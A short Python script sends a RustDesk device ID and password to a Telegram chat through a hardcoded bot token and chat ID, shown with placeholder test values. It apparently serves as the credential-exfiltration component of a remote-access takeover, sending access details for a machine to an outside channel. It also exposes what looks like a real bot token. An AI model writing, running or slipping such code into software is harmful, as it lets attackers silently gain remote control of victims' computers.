
import requests
import json

def send_to_telegram(message):
    bot_token = "8340442444:AAGf89TVURa8dQBMV4gO-v_6RLcizvVHd5Y"
    chat_id = "-1002925166450"
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, data=payload)
        return response.status_code == 200
    except:
        return False

# Пример использования
if __name__ == "__main__":
    device_id = "TEST_DEVICE_ID"
    password = "TEST_PASSWORD"
    message = f"🚨 RustDesk Connected\n📱 Device: {device_id}\n🔑 Password: {password}"
    
    send_to_telegram(message)
